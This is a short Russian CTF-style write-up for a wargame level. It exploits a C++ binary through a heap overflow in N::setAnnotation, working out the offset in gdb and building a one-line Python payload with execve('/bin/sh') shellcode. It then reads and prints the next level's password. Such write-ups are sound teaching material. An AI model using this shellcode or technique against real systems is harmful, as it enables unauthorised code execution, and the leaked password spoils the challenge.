На этом уровне у нас бинарник программы написанной на С++

>c++filt _ZN1NC2Ei
N::N(int)

>c++filt _Znwj
operator new(unsigned int)

>c++filt _ZN1N13setAnnotationEPc
N::setAnnotation(char*)

info functions:
0x080486f6  N::N(int)
0x080486f6  N::N(int)
0x0804870e  N::setAnnotation(char*)
0x0804873a  N::operator+(N&)
0x0804874e  N::operator-(N&)

Среди функций нет system/execve, который обычно передаёт управление командному процессору, например '/bin/sh', это значит что будем использовать шелл-код.
Передача управления шелл-коду осуществляется перезаписью адреса возврата в стеке адресом внедрённого шелл-кода,
перезаписью адресов вызываемых функций или изменением обработчиков прерываний.
Мы должны использовать memcpy() setAnnotation()для вызова шелл-кода.
Узнаем что смещение на 108 байте.(Добиваемся Segmentation fault).

Для этого мы должны найти начальный адрес нашего буфера и заменить на него значение esp+0x10, чтобы вызвать edxвызовы нашего шеллкода. Но поскольку нам нужно дважды разыменовать,
как мы хотим получить доступ к классу N, наш адрес возврата должен указывать на адрес, который указывает на начальный буфер:

(gdb) b *main+136
Breakpoint 1 at 0x804867c
(gdb) run 'AAAA'
Starting program: /home/user/level9/level9 'AAAA'

Breakpoint 1, 0x0804867c in main ()
(gdb) x $eax
0x804a00c:      0x41414141
Значение [esp + 0x10] будет заменено на 0x804a00c.
Поскольку нам снова нужно разыменовать, этот адрес будет указывать на начало нашего шелл-кода: 0x804a00x + 4 = 0x804a010.

>./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * 76 + "\x0c\xa0\04\x08"')

cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
